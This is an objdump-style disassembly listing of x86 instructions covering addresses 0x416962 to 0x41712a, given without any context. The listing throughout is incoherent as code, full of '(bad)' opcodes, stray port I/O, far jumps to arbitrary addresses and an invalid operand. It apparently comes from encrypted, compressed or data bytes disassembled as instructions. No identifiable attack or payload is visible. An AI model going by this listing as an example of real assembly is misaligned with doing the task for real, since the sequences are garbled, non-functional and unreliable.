  416962:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416963:	pusha  
  416964:	push   es
  416965:	in     al,dx
  416966:	jg     0x416993
  416968:	cmp    cl,dl
  41696a:	pop    ss
  41696b:	repnz push 0xf888f509
  416971:	or     bh,BYTE PTR [ecx+0x4]
  416974:	dec    esi
  416975:	inc    edx
  416976:	or     ebx,DWORD PTR [ebx+0x393a42fc]
  41697c:	int3   
  41697d:	or     al,0x84
  41697f:	retf   
  416980:	in     eax,0xdd
  416982:	fbstp  TBYTE PTR [eax]
  416984:	test   BYTE PTR [eax+0x5eaba398],0xc
  41698b:	and    DWORD PTR [edi],edi
  41698d:	aam    0x77
  41698f:	jne    0x41695c
  416991:	push   es
  416992:	or     bh,BYTE PTR [ebx-0xb]
  416995:	jmp    FWORD PTR [edx-0x1e5bd84a]
  41699b:	mov    bh,0x59
  41699d:	stos   DWORD PTR es:[edi],eax
  41699e:	cmp    cl,BYTE PTR [edx]
  4169a0:	xchg   ecx,eax
  4169a1:	nop
  4169a2:	in     eax,0x96
  4169a4:	jmp    0xea62e685
  4169a9:	xchg   ecx,eax
  4169aa:	xchg   ebx,eax
  4169ab:	out    0x8c,al
  4169ad:	sbb    ebp,DWORD PTR [edi]
  4169af:	inc    eax
  4169b0:	int    0x42
  4169b2:	adc    eax,0x57dcb9d0
  4169b7:	inc    ecx
  4169b8:	rcr    DWORD PTR cs:[ebx-0x7b1a0c31],1
  4169bf:	test   bh,al
  4169c1:	outs   dx,BYTE PTR ds:[esi]
  4169c2:	dec    eax
  4169c3:	out    0x34,eax
  4169c5:	mov    esi,0x1975a483
  4169ca:	es fcmovb st,st(4)
  4169cd:	pop    esp
  4169ce:	mov    al,ds:0x47ac2346
  4169d3:	push   es
  4169d4:	std    
  4169d5:	or     DWORD PTR ds:0x937779d0,edx
  4169db:	jmp    0xe0ac:0xf6fd6954
  4169e2:	xchg   DWORD PTR [ebp-0x24],esp
  4169e5:	sub    DWORD PTR [eax+0x48],eax
  4169e8:	push   ebp
  4169e9:	or     BYTE PTR [edx],cl
  4169eb:	xor    al,BYTE PTR [ebp-0x7c]
  4169ee:	xchg   ebx,eax
  4169ef:	fwait
  4169f0:	shl    DWORD PTR [ebp-0x72854062],0xec
  4169f7:	adc    al,0xab
  4169f9:	xor    al,0x29
  4169fb:	lods   eax,DWORD PTR ds:[esi]
  4169fc:	fcomp  QWORD PTR [eax-0x73]
  4169ff:	or     BYTE PTR [edi+edx*8-0x13],cl
  416a03:	shl    DWORD PTR [eax],1
  416a05:	xor    al,0x23
  416a07:	rcr    DWORD PTR [esi+0x4d5c5af5],cl
  416a0d:	inc    ebp
  416a0e:	(bad)  
  416a0f:	xchg   esp,eax
  416a10:	mov    ch,0x11
  416a12:	xchg   edx,eax
  416a13:	out    0xc8,eax
  416a15:	gs xchg esi,eax
  416a17:	rol    BYTE PTR [eax+0x56],0x84
  416a1b:	leave  
  416a1c:	dec    esp
  416a1d:	mov    DWORD PTR [edx+0x761266a4],esi
  416a23:	dec    esp
  416a24:	dec    esp
  416a25:	dec    ecx
  416a26:	std    
  416a27:	dec    esi
  416a28:	push   es
  416a29:	or     al,bl
  416a2b:	(bad)  
  416a2c:	rcl    esp,cl
  416a2e:	js     0x416a08
  416a30:	inc    DWORD PTR [eax-0x7748a9f]
  416a36:	mov    edi,0x96ce051c
  416a3b:	loop   0x416a74
  416a3d:	or     DWORD PTR [eax],0xffffffd1
  416a40:	dec    eax
  416a41:	ret    0x2749
  416a44:	ficom  WORD PTR [ebp-0x57]
  416a47:	sub    al,0xf9
  416a49:	xlat   BYTE PTR ds:[ebx]
  416a4a:	pop    edx
  416a4b:	add    esp,DWORD PTR [esp+ebp*2-0xaed41dc]
  416a52:	jne    0x416a29
  416a54:	iret   
  416a55:	xchg   edi,eax
  416a56:	dec    edi
  416a57:	xchg   esp,eax
  416a58:	rcr    eax,1
  416a5a:	mov    eax,0xfbb0f3fa
  416a5f:	push   edx
  416a60:	xchg   ebp,eax
  416a61:	xor    esp,ebp
  416a63:	jno    0x416a4f
  416a65:	popf   
  416a66:	push   edi
  416a67:	rcl    DWORD PTR [edx+0xd49fe3a],cl
  416a6d:	add    cl,BYTE PTR [edi]
  416a6f:	(bad)  
  416a70:	push   esp
  416a71:	pop    ebp
  416a72:	jmp    0xbd53efab
  416a77:	jecxz  0x416aa3
  416a79:	add    DWORD PTR [ebp+0x1986a509],ebx
  416a7f:	pop    ebx
  416a80:	mov    ds:0x6d1f15f0,eax
  416a85:	ret    
  416a86:	jno    0x416aa5
  416a88:	addr16 mov esi,0xa12446cc
  416a8e:	clc    
  416a8f:	pop    edi
  416a90:	leave  
  416a91:	and    al,0xa8
  416a93:	sub    edi,DWORD PTR [ebx+ebx*8]
  416a96:	lahf   
  416a97:	pop    es
  416a98:	je     0x416a2d
  416a9a:	(bad)  
  416a9b:	mov    esp,DWORD PTR [esp+ecx*4]
  416a9e:	retf   0xb454
  416aa1:	xchg   DWORD PTR [edx+eax*4-0x44],ebx
  416aa5:	dec    edi
  416aa6:	adc    ch,dh
  416aa8:	out    dx,eax
  416aa9:	rol    DWORD PTR [eax+0x56],0xdd
  416aad:	(bad)  
  416aae:	mov    esp,0xf305ffd
  416ab3:	add    ebx,DWORD PTR [ecx+0x79]
  416ab6:	cmp    al,0x97
  416ab8:	retf   
  416ab9:	inc    esi
  416aba:	push   0x2b
  416abc:	fcmovbe st,st(5)
  416abe:	mov    ds:0xe2edafe1,eax
  416ac3:	retf   
  416ac4:	scas   eax,DWORD PTR es:[edi]
  416ac5:	bound  ecx,QWORD PTR [esi+eiz*4]
  416ac8:	loopne 0x416ac6
  416aca:	mov    esi,DWORD PTR [edi+0x1e05ea80]
  416ad0:	push   edi
  416ad1:	mov    ebx,0x56233b49
  416ad6:	scas   eax,DWORD PTR es:[edi]
  416ad7:	cld    
  416ad8:	push   0x7efaa0d1
  416add:	popf   
  416ade:	aas    
  416adf:	and    edx,DWORD PTR [ebx+0x3e]
  416ae2:	or     al,0x1e
  416ae4:	jae    0x416b3d
  416ae6:	std    
  416ae7:	jnp    0x416aec
  416ae9:	loopne 0x416a77
  416aeb:	scas   eax,DWORD PTR es:[edi]
  416aec:	sub    eax,0xa798a039
  416af1:	and    cl,BYTE PTR [esi+esi*4]
  416af4:	imul   ebp,DWORD PTR [esi-0x80],0xffffff9d
  416af8:	mov    dl,BYTE PTR [edx+0x6a]
  416afb:	(bad)  
  416afc:	movzx  esi,BYTE PTR [esi]
  416aff:	neg    bl
  416b01:	repz sub al,0xec
  416b04:	dec    esp
  416b05:	xchg   ecx,eax
  416b06:	sar    BYTE PTR [edx],0x46
  416b09:	aam    0x8b
  416b0b:	adc    al,0xf
  416b0d:	fwait
  416b0e:	jmp    0x85c40272
  416b13:	add    al,BYTE PTR [eax]
  416b15:	ficomp WORD PTR [edi]
  416b17:	sub    eax,0xfc8ec36d
  416b1c:	jl     0x416ade
  416b1e:	adc    al,0xd5
  416b20:	push   0x96c41856
  416b25:	mov    ecx,0xb9e28a28
  416b2a:	cmc    
  416b2b:	nop
  416b2c:	push   cs
  416b2d:	jne    0x416ba6
  416b2f:	stos   BYTE PTR es:[edi],al
  416b30:	dec    esi
  416b31:	fstp   QWORD PTR [ebx+0x4e38b1ab]
  416b37:	pop    es
  416b38:	push   DWORD PTR [eax]
  416b3a:	iret   
  416b3b:	rol    DWORD PTR [ebp+0x7f],cl
  416b3e:	cmp    DWORD PTR [ecx+ecx*8-0x275a558c],edx
  416b45:	jmp    0x416b36
  416b47:	les    edi,FWORD PTR [esp+eax*2]
  416b4a:	mov    edi,0x9efc662c
  416b4f:	inc    ebp
  416b50:	add    ah,dh
  416b52:	mov    edi,0xa043e46d
  416b57:	jmp    0x6d6fe2d1
  416b5c:	sub    eax,0x172a3926
  416b61:	mov    ecx,0x1dcedea8
  416b66:	adc    esp,DWORD PTR [esi]
  416b68:	lds    esp,FWORD PTR [edx]
  416b6a:	sbb    cl,BYTE PTR [ebx+ecx*2+0x7f]
  416b6e:	test   DWORD PTR [ebx+0x6e],0xcd9fd728
  416b75:	cmp    DWORD PTR [ecx-0x44],edx
  416b78:	sbb    al,0x6f
  416b7a:	data16 dec BYTE PTR [esi+0xe]
  416b7e:	sbb    DWORD PTR [ecx+0x19fa4fb9],ebp
  416b84:	cmc    
  416b85:	fsub   QWORD PTR [ebp+0x222454ff]
  416b8b:	bound  esi,QWORD PTR [ebp-0x4]
  416b8e:	cmp    al,0x8
  416b90:	cmp    DWORD PTR [edx-0x3e],0x4b
  416b94:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  416b96:	iret   
  416b97:	or     eax,DWORD PTR [ecx+0x28]
  416b9a:	mov    cl,0x34
  416b9c:	push   edi
  416b9d:	nop
  416b9e:	dec    ebp
  416b9f:	or     al,0x77
  416ba1:	jb     0x416b77
  416ba3:	leave  
  416ba4:	and    BYTE PTR [ebx],dh
  416ba6:	lds    ecx,FWORD PTR [esi+0x41]
  416ba9:	jae    0x416c21
  416bab:	pop    ebx
  416bac:	adc    DWORD PTR [ecx+0x5a],esp
  416baf:	rcr    BYTE PTR [edx+0x10e8a44],cl
  416bb5:	mov    ecx,DWORD PTR [eax-0x5429c86a]
  416bbb:	push   ds
  416bbc:	out    dx,eax
  416bbd:	aaa    
  416bbe:	shl    DWORD PTR [ecx],1
  416bc0:	test   al,0x23
  416bc2:	sbb    al,0xb4
  416bc4:	mov    dh,0xb6
  416bc6:	das    
  416bc7:	jmp    0xaba2:0x4fba7113
  416bce:	push   cs
  416bcf:	jb     0x416bc2
  416bd1:	mov    BYTE PTR [edx],cl
  416bd3:	out    dx,eax
  416bd4:	push   edx
  416bd5:	sbb    dh,BYTE PTR ds:0x9ddf337e
  416bdb:	(bad)  
  416bdc:	jp     0x416bec
  416bde:	shr    DWORD PTR [eax-0x320e8528],1
  416be4:	(bad)  
  416be5:	xlat   BYTE PTR ds:[ebx]
  416be6:	rcl    DWORD PTR [esp+edx*8+0x72],1
  416bea:	xor    dl,BYTE PTR [edx-0x2030136a]
  416bf0:	cmp    BYTE PTR [edi-0x15],bl
  416bf3:	imul   esp,esi,0x52030b48
  416bf9:	test   BYTE PTR [esi-0x4a85054d],bh
  416bff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c00:	(bad)
  416c03:	jae    0x416ba1
  416c05:	cli    
  416c06:	in     al,0x44
  416c08:	jge    0x416c86
  416c0a:	and    esp,edx
  416c0c:	call   0x3e7a3596
  416c11:	jmp    0x8969:0xae5740a4
  416c18:	or     al,0x37
  416c1a:	add    ebx,DWORD PTR [ecx]
  416c1c:	sub    bh,bl
  416c1e:	push   esi
  416c1f:	rol    BYTE PTR [edi],0x21
  416c22:	jge    0x416be4
  416c24:	rcr    bh,0xea
  416c27:	dec    edi
  416c28:	mov    al,BYTE PTR [edx]
  416c2a:	sbb    ecx,DWORD PTR [esp+eiz*8-0x6eca5937]
  416c31:	ins    DWORD PTR es:[edi],dx
  416c32:	call   0xd1fb:0xb83e3424
  416c39:	jae    0x416bd4
  416c3b:	adc    esi,DWORD PTR [edx+0x463b977b]
  416c41:	or     BYTE PTR [eax+0xa],0xef
  416c45:	lahf   
  416c46:	imul   edx,DWORD PTR [ebp-0xf],0xd059b5a0
  416c4d:	push   cs
  416c4e:	(bad)  
  416c4f:	sbb    eax,0x29ea2157
  416c54:	sub    ch,al
  416c56:	retf   0xb16e
  416c59:	sbb    eax,0x5ecc6f8a
  416c5e:	into   
  416c5f:	js     0x416cac
  416c61:	jmp    0x416c7a
  416c63:	(bad)  
  416c64:	in     al,dx
  416c65:	(bad)  
  416c66:	fisttp WORD PTR [ecx+ebx*1]
  416c69:	pop    ebx
  416c6a:	enter  0xc6cc,0x37
  416c6e:	adc    al,0x73
  416c70:	outs   dx,DWORD PTR ds:[esi]
  416c71:	lods   al,BYTE PTR ds:[esi]
  416c72:	dec    ebx
  416c73:	ds out 0xf,eax
  416c76:	scas   eax,DWORD PTR es:[edi]
  416c77:	xchg   ebx,eax
  416c78:	lock cli 
  416c7a:	mov    ch,dl
  416c7c:	sub    BYTE PTR [ebx],bh
  416c7e:	pop    edx
  416c7f:	push   0x5a86b645
  416c84:	mov    cl,0xef
  416c86:	add    al,dl
  416c88:	call   0xfb9f:0xcbe0908f
  416c8f:	ret    
  416c90:	retf   
  416c91:	add    edi,DWORD PTR [eax-0x58]
  416c94:	out    0x1b,al
  416c96:	addr16 inc edi
  416c98:	push   ebp
  416c99:	push   ss
  416c9a:	and    BYTE PTR [eax+eax*1],ah
  416c9d:	fsub   DWORD PTR [ebx]
  416c9f:	loop   0x416c65
  416ca1:	stos   BYTE PTR es:[edi],al
  416ca2:	pop    edi
  416ca3:	jae    0x416cab
  416ca5:	outs   dx,DWORD PTR ds:[esi]
  416ca6:	test   BYTE PTR [esi],dl
  416ca8:	push   cs
  416ca9:	push   esp
  416caa:	mov    ss,WORD PTR [ecx+edi*8]
  416cad:	pushf  
  416cae:	out    0xf,eax
  416cb0:	add    DWORD PTR [ebx-0x3b],0xd5e99319
  416cb7:	pop    es
  416cb8:	dec    edx
  416cb9:	xchg   BYTE PTR [eax],ah
  416cbb:	xchg   ebx,eax
  416cbc:	inc    edx
  416cbd:	jns    0x416c99
  416cbf:	js     0x416c69
  416cc1:	cmp    BYTE PTR [ecx+0x57],dl
  416cc4:	mov    ah,0x78
  416cc6:	push   eax
  416cc7:	test   eax,0x74bc213a
  416ccc:	mov    al,0x41
  416cce:	js     0x416cf1
  416cd0:	inc    esi
  416cd1:	fucom  st(2)
  416cd3:	shr    DWORD PTR [esi+0x8],1
  416cd6:	jmp    0x723c887f
  416cdb:	cs and al,0x3
  416cde:	push   es
  416cdf:	jl     0x416ce9
  416ce1:	jns    0x416cb9
  416ce3:	(bad)  
  416ce4:	lea    ecx,[edi-0x5e]
  416ce7:	les    ebx,FWORD PTR [edx-0x6022ebd2]
  416ced:	mov    ecx,0x3b476751
  416cf2:	outs   dx,DWORD PTR ds:[esi]
  416cf3:	fldenv [edi-0x300550df]
  416cf9:	sub    ch,BYTE PTR [eax]
  416cfb:	mov    esi,0x27d07276
  416d00:	test   bh,0xb1
  416d03:	xchg   edx,eax
  416d04:	jbe    0x416cd9
  416d06:	xor    esp,esp
  416d08:	add    eax,0xa675d64f
  416d0d:	jae    0x416ce8
  416d0f:	hlt    
  416d10:	sub    eax,0x46ee42c0
  416d15:	fld    QWORD PTR [ebp+0x32]
  416d18:	call   0x8404:0xca86f9c7
  416d1f:	pop    es
  416d20:	or     eax,DWORD PTR [ebp+0x1e]
  416d23:	xor    BYTE PTR [eax-0x37e2f541],cl
  416d29:	in     eax,dx
  416d2a:	jg     0x416d1a
  416d2c:	mov    ds:0x1c5f5dd7,eax
  416d31:	and    eax,0xdd87c69f
  416d36:	jmp    0x2644:0xb73cd843
  416d3d:	into   
  416d3e:	in     al,dx
  416d3f:	test   DWORD PTR [ecx-0x51],ecx
  416d42:	test   eax,0x677449c6
  416d47:	(bad)  
  416d48:	sub    BYTE PTR [esi+0x63],bl
  416d4b:	fs (bad) 
  416d4e:	mov    eax,0xe97b624c
  416d53:	or     eax,0x1a5d2133
  416d58:	and    edx,esp
  416d5a:	xor    bh,bl
  416d5c:	hlt    
  416d5d:	inc    ecx
  416d5e:	jl     0x416d08
  416d60:	jno    0x416cf9
  416d62:	(bad)  
  416d64:	push   esp
  416d65:	and    DWORD PTR [ebp+0x60],ebp
  416d68:	mov    ecx,0xc77f1
  416d6d:	(bad)  
  416d6e:	jl     0x416d73
  416d70:	std    
  416d71:	adc    eax,0xbb9cface
  416d76:	xor    edx,DWORD PTR [edi+0x35]
  416d79:	dec    eax
  416d7a:	fcmovnu st,st(5)
  416d7c:	adc    eax,0x3f8ce8ce
  416d81:	retf   0x3ee6
  416d84:	xor    eax,0xa0a038c6
  416d89:	xchg   edi,eax
  416d8a:	inc    esp
  416d8b:	es enter 0xb236,0xb2
  416d90:	clc    
  416d91:	test   edx,edi
  416d93:	mov    ebp,0x635e463c
  416d98:	xchg   ebx,eax
  416d99:	daa    
  416d9a:	dec    esi
  416d9b:	je     0x416df5
  416d9d:	pop    ebx
  416d9e:	jg     0x416e11
  416da0:	dec    esi
  416da1:	rol    DWORD PTR [ecx],0x87
  416da4:	inc    sp
  416da6:	sbb    ch,bl
  416da8:	in     al,0x28
  416daa:	pop    edx
  416dab:	push   0xffffff9a
  416dad:	in     al,0xb8
  416daf:	out    dx,al
  416db0:	leave  
  416db1:	jmp    0x980a:0x735bf921
  416db8:	loop   0x416dd3
  416dba:	or     BYTE PTR [edx+ecx*8],dl
  416dbd:	test   BYTE PTR [esi+0x76bca3ee],bh
  416dc3:	fdiv   DWORD PTR [ebp-0x672da674]
  416dc9:	cmovle esi,DWORD PTR [ebp-0x2fb15546]
  416dd0:	mov    dh,0x4
  416dd2:	mov    eax,0xdbdb3873
  416dd7:	(bad)  
  416dd8:	popf   
  416dd9:	clc    
  416dda:	inc    ebp
  416ddb:	fstp   QWORD PTR [ebx+0x54a539a0]
  416de1:	clc    
  416de2:	out    dx,al
  416de3:	sub    ebx,DWORD PTR [edi]
  416de5:	sub    al,dl
  416de7:	jbe    0x416da9
  416de9:	xchg   ecx,eax
  416dea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416deb:	mov    ch,0x7a
  416ded:	pop    ebx
  416dee:	fs xchg ebp,eax
  416df0:	popf   
  416df1:	sub    al,0xb8
  416df3:	cmp    al,0xb8
  416df5:	(bad)  
  416df6:	jmp    0x416dcc
  416df8:	jle    0x416dcf
  416dfa:	aad    0x4a
  416dfc:	ret    0xc5b3
  416dff:	jmp    0x416e5f
  416e01:	je     0x416e35
  416e03:	cmp    BYTE PTR ds:0x590236cb,bl
  416e09:	ret    0x350c
  416e0c:	push   es
  416e0d:	and    DWORD PTR [edi+0x792c40af],0xfffffff7
  416e14:	cwde   
  416e15:	mov    edi,0xd6c4b90b
  416e1a:	(bad)
  416e1d:	or     eax,0xf299a0d4
  416e22:	xchg   eax,edi
  416e24:	jmp    0xb9c10279
  416e29:	and    al,0xc4
  416e2b:	in     eax,0x62
  416e2d:	pop    eax
  416e2e:	cwde   
  416e2f:	popf   
  416e30:	mov    ch,0x2f
  416e32:	in     eax,0xdd
  416e34:	mov    ah,BYTE PTR [ebp-0x1d820ba5]
  416e3a:	lea    ecx,[edx+edx*2]
  416e3d:	cmp    edi,esp
  416e3f:	in     al,0x4c
  416e41:	mov    ds:0x2204cd3c,eax
  416e46:	or     dh,bl
  416e48:	jl     0x416e64
  416e4a:	xchg   edx,eax
  416e4b:	bound  edx,QWORD PTR [edi+0x69]
  416e4e:	xor    al,0x8
  416e50:	cmp    edi,ebx
  416e52:	not    BYTE PTR [eax-0x64]
  416e55:	in     al,dx
  416e56:	sub    eax,0x6cd54325
  416e5b:	xchg   ecx,eax
  416e5c:	fild   QWORD PTR cs:[ecx+0x13]
  416e60:	adc    al,0xfa
  416e62:	jno    0x416e99
  416e64:	push   ds
  416e65:	inc    ecx
  416e66:	popf   
  416e67:	loope  0x416e9d
  416e69:	out    0xb6,al
  416e6b:	fwait
  416e6c:	sbb    eax,0xa2386a37
  416e71:	jl     0x416e37
  416e73:	fs jbe 0x416dfe
  416e76:	jno    0x416ec5
  416e78:	fnstcw WORD PTR [edx]
  416e7a:	dec    esp
  416e7b:	mov    bl,0x22
  416e7d:	test   al,0xe6
  416e7f:	push   ss
  416e80:	rcr    bl,cl
  416e82:	fcom   QWORD PTR [esi]
  416e84:	stc    
  416e85:	jne    0x416e58
  416e87:	sbb    eax,0x3d212788
  416e8c:	mov    ecx,0x6717077b
  416e91:	xchg   ecx,eax
  416e92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e93:	inc    edx
  416e94:	aam    0xcf
  416e96:	imul   eax,DWORD PTR [ebp+0x4c],0x4148abfb
  416e9d:	(bad)  
  416e9e:	mov    ah,0x65
  416ea0:	and    ecx,DWORD PTR [ecx+0x6f6276d2]
  416ea6:	push   ds
  416ea7:	xor    edi,DWORD PTR [esi+edi*1+0x4ab854ba]
  416eae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416eaf:	out    dx,al
  416eb0:	cdq    
  416eb1:	adc    BYTE PTR [ecx+ecx*2+0x3fd63c7a],al
  416eb8:	jg     0x416ec8
  416eba:	dec    edi
  416ebb:	push   edi
  416ebc:	mov    esi,0x6d0d3a58
  416ec1:	cmp    eax,0x364f721e
  416ec6:	push   esi
  416ec7:	add    BYTE PTR [esi+0x7f],dl
  416eca:	aam    0xed
  416ecc:	mov    DWORD PTR [ecx+0x16],0x39ad0764
  416ed3:	xor    BYTE PTR [ebx],ah
  416ed5:	fwait
  416ed6:	cli    
  416ed7:	jg     0x416e96
  416ed9:	sbb    esi,ebp
  416edb:	je     0x416efb
  416edd:	push   0xffffffa0
  416edf:	pop    ebx
  416ee0:	cld    
  416ee1:	or     esp,esi
  416ee3:	cmc    
  416ee4:	mov    bl,dh
  416ee6:	jae    0x416ea9
  416ee8:	sub    DWORD PTR [edx+0x7ec8c29b],edx
  416eee:	cmp    DWORD PTR [ebx+eax*1-0x52],ebx
  416ef2:	inc    edi
  416ef4:	mov    esi,0xa80f70aa
  416ef9:	sar    BYTE PTR [ebx+0x6a],1
  416efc:	mov    eax,ds:0xc394e1e7
  416f01:	int    0x2a
  416f03:	mov    esp,ebp
  416f05:	add    esp,DWORD PTR [ebp-0x26d69ef]
  416f0b:	mov    esi,ss
  416f0d:	mov    al,BYTE PTR [eax+esi*1]
  416f10:	aam    0x2e
  416f12:	cdq    
  416f13:	mov    eax,DWORD PTR [ecx+0x70]
  416f16:	or     BYTE PTR [ecx],bl
  416f18:	mov    bl,0xf8
  416f1a:	xchg   edx,eax
  416f1b:	inc    edi
  416f1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f1d:	push   ebp
  416f1e:	pop    es
  416f1f:	cmp    ch,BYTE PTR [esp+ebx*1-0x55]
  416f23:	mov    esp,DWORD PTR ds:0x83f665c7
  416f29:	mov    BYTE PTR [esp+esi*8-0x4d55239f],ah
  416f30:	(bad)  
  416f31:	mov    ch,0x78
  416f33:	hlt    
  416f34:	stos   BYTE PTR es:[edi],al
  416f35:	sub    ch,bl
  416f37:	add    bl,ah
  416f39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f3a:	outs   dx,DWORD PTR ds:[esi]
  416f3b:	cdq    
  416f3c:	bound  edi,QWORD PTR [ecx]
  416f3e:	jmp    0x5d29:0x7dc82eaf
  416f45:	bound  ebx,QWORD PTR [edi-0x3900a579]
  416f4b:	call   0xdfa2:0x9a7543bd
  416f52:	xchg   esi,edi
  416f54:	push   cs
  416f55:	adc    DWORD PTR ds:0x9495d515,edi
  416f5b:	or     al,0x8
  416f5d:	loope  0x416f3c
  416f5f:	loopne 0x416f4a
  416f61:	mov    bh,0xee
  416f63:	les    ebp,FWORD PTR [edx]
  416f65:	fmul   QWORD PTR [eax+0x34]
  416f68:	mov    ah,0xc7
  416f6a:	mov    ch,dl
  416f6c:	and    BYTE PTR [edx+0x1b],ah
  416f6f:	xor    BYTE PTR [ebx],cl
  416f71:	mov    ds:0x62c4960c,eax
  416f76:	push   edx
  416f77:	cmp    DWORD PTR [edx],edi
  416f79:	ret    
  416f7a:	not    BYTE PTR [ebp-0x3f]
  416f7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f7e:	gs in  al,0x46
  416f81:	ror    BYTE PTR [edi],cl
  416f83:	cmp    bh,BYTE PTR [esi+0x60]
  416f86:	xlat   BYTE PTR ds:[ebx]
  416f87:	rcl    BYTE PTR ds:0x302acdfb,1
  416f8d:	and    al,0xe
  416f8f:	mov    edi,0xc90c2623
  416f94:	(bad)  
  416f95:	adc    BYTE PTR [ebx-0x11895672],cl
  416f9b:	fwait
  416f9c:	into   
  416f9d:	mov    ah,0x68
  416f9f:	data16 (bad) 
  416fa1:	sbb    al,0xe4
  416fa3:	xor    DWORD PTR [ebx-0x745794c5],edi
  416fa9:	fdivp  st(2),st
  416fab:	mov    bl,0x85
  416fad:	jle    0x416f8a
  416faf:	push   edi
  416fb0:	ja     0x417019
  416fb2:	fs adc eax,0x8e894092
  416fb8:	fist   WORD PTR ds:0x1a35277
  416fbe:	fadd   DWORD PTR [esi]
  416fc0:	jge    0x41703d
  416fc2:	adc    al,0x3e
  416fc4:	jp     0x41701d
  416fc6:	(bad)  
  416fc7:	fnstenv [edi+0x506a7927]
  416fcd:	inc    edi
  416fce:	cmp    al,BYTE PTR [ecx-0x65]
  416fd1:	cmc    
  416fd2:	sahf   
  416fd3:	test   al,0xab
  416fd5:	xor    bh,BYTE PTR [edx-0x36]
  416fd8:	xchg   esi,eax
  416fd9:	pop    eax
  416fda:	jo     0x417028
  416fdc:	adc    dh,dl
  416fde:	and    bl,BYTE PTR [edx+esi*1]
  416fe1:	push   0x42
  416fe3:	jp     0x416ffb
  416fe5:	xchg   edi,eax
  416fe6:	das    
  416fe7:	loop   0x416f6a
  416fe9:	retf   
  416fea:	imul   esp,DWORD PTR [esi+0x6f32dbfe],0x7e
  416ff1:	cli    
  416ff2:	or     eax,0xd8c0253d
  416ff7:	sbb    ah,ah
  416ff9:	fcom   DWORD PTR [edx]
  416ffb:	bound  ebp,QWORD PTR [eax+0x4a]
  416ffe:	loopne 0x416ffe
  417000:	shl    DWORD PTR [edi+0x71],1
  417003:	mov    ecx,0x319c6f38
  417008:	addr16 xchg esp,eax
  41700a:	xchg   ecx,eax
  41700b:	std    
  41700c:	adc    al,0x6a
  41700e:	out    dx,al
  41700f:	jb     0x417047
  417011:	ins    DWORD PTR es:[edi],dx
  417012:	rcl    DWORD PTR [esi+edi*4+0xe],1
  417016:	push   edi
  417017:	and    eax,0xc9692bcb
  41701c:	fst    DWORD PTR ds:0x31b29426
  417022:	jmp    0x424c:0xae884d8a
  417029:	lds    ebx,FWORD PTR [esi+ecx*2-0x7d02f9c0]
  417030:	or     eax,0x3abe610d
  417035:	inc    ebp
  417036:	or     edi,DWORD PTR [edx+ebp*1-0x29be2af7]
  41703d:	jmp    0xafcb4c21
  417042:	(bad)  
  417043:	sub    esp,DWORD PTR [esi-0x1]
  417046:	ds rcr ebp,1
  417049:	fidivr WORD PTR ds:[edi]
  41704c:	clc    
  41704d:	or     eax,0xce2e3f5e
  417052:	jmp    0xc5f6:0x4e3c40f9
  417059:	jae    0x417021
  41705b:	add    dh,BYTE PTR [esp+eiz*8-0x60]
  41705f:	cdq    
  417060:	inc    edi
  417061:	aas    
  417062:	mov    cs,WORD PTR [ebx+0x5b]
  417065:	test   al,0xd9
  417067:	jnp    0x41706b
  417069:	iretw  
  41706b:	mov    edx,0x74ad6116
  417070:	push   ebx
  417071:	sub    al,0x28
  417073:	or     ebx,0xfffffff7
  417076:	nop
  417077:	nop
  417078:	push   es
  417079:	lock aad 0x45
  41707c:	lahf   
  41707d:	mov    BYTE PTR [ebx+0xce6be0],0xd1
  417084:	pop    edx
  417085:	loop   0x4170d0
  417087:	pop    esp
  417088:	out    dx,eax
  417089:	mov    dl,0x34
  41708b:	es pusha 
  41708d:	mov    ebp,DWORD PTR ds:0x6f08cfec
  417093:	push   es
  417094:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417095:	cs jne 0x417049
  417098:	not    BYTE PTR ds:0xff8db46
  41709e:	scas   al,BYTE PTR es:[edi]
  41709f:	sbb    BYTE PTR [esi+0x8],cl
  4170a2:	xchg   ecx,eax
  4170a3:	and    edi,DWORD PTR [ebp-0x49]
  4170a6:	cmp    dl,cl
  4170a8:	xchg   edx,eax
  4170a9:	bound  ecx,QWORD PTR [eax]
  4170ab:	bound  ecx,QWORD PTR [edi+0x63]
  4170ae:	xchg   ebp,eax
  4170af:	dec    esp
  4170b0:	rcr    bl,1
  4170b2:	push   0xa9201295
  4170b7:	jmp    0x6e60:0xb7c2cb78
  4170be:	nop
  4170bf:	popa   
  4170c0:	add    al,0x5a
  4170c2:	ins    BYTE PTR es:[edi],dx
  4170c3:	sbb    edi,DWORD PTR [eax]
  4170c5:	push   eax
  4170c6:	out    0xcf,al
  4170c8:	imul   DWORD PTR [esi]
  4170ca:	test   eax,0x1b90b748
  4170cf:	test   esp,edx
  4170d1:	leave  
  4170d2:	cli    
  4170d3:	call   0x32ef8dfd
  4170d8:	mov    ?,WORD PTR [ebx+esi*1]
  4170db:	add    eax,0x2e38a369
  4170e0:	js     0x417088
  4170e2:	jnp    0x4170c3
  4170e4:	xchg   esi,eax
  4170e5:	inc    ebx
  4170e6:	inc    ecx
  4170e7:	lds    edx,FWORD PTR [ebx-0x6d]
  4170ea:	sahf   
  4170eb:	mov    esi,0x2584be12
  4170f0:	mov    dl,cl
  4170f2:	dec    edx
  4170f3:	mul    BYTE PTR [eax*8-0x19d514a7]
  4170fa:	fidivr WORD PTR ds:0xe08dc165
  417100:	add    al,0x74
  417102:	(bad)  
  417104:	daa    
  417105:	cmp    al,0x82
  417107:	mov    esi,0x89d10348
  41710c:	je     0x417115
  41710e:	inc    eax
  41710f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417110:	fiadd  DWORD PTR [edi-0x29]
  417113:	xor    DWORD PTR [edx-0x125250f7],ecx
  417119:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41711a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41711b:	popa   
  41711c:	jecxz  0x417135
  41711e:	xor    edi,ecx
  417120:	ret    0xf894
  417123:	into   
  417124:	daa    
  417125:	mov    al,0x2f
  417127:	push   ebp
  417128:	xor    ch,dl
  41712a:	adc    esi,eax
